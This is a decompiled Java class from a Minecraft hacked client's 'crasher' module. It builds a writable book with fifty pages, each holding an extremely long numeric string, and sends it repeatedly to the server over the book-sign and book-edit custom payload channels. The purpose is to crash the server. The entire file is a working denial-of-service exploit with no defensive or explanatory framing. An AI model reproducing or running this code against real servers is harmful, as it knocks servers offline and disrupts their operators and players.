// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import java.util.Random;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class CustomPayloadCrasher10
{
    public static void start() {
        final ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        Minecraft.getMinecraft();
        final String author = Minecraft.getSession().getUsername();
        final String title = "CustomPayLoadCrasher_II";
        final String size = "387492654897365785634786564534235355657213245346456476765756676732455123534534646455697934653523233223535346456768785685647235124214124235236344575686787485634587474586754685476456784465785678645787834534678346783467846378456783567847723727867827875656756979792346797967789003263547968374237468672863426787878967896478457878678678813267878134678383471346797798679679369456795679756459748953720682459076856709837968234769323578957893789434678934734789768968855756678936478934678934678969459864758495745872897893478978978987947846378964789367894567897348256955559595959595959595959595959595959595959476794565694567894567894689768934689458945894538945989";
        for (int i = 0; i < 50; ++i) {
            final String siteContent = size;
            final NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        stack.setTagInfo("pages", list);
        stack.setTagCompound(tag);
        final PacketBuffer packet = new PacketBuffer(Unpooled.buffer());
        packet.writeItemStackToBuffer(stack);
        for (int j = 1; j < 10; ++j) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packet));
        }
    }
}
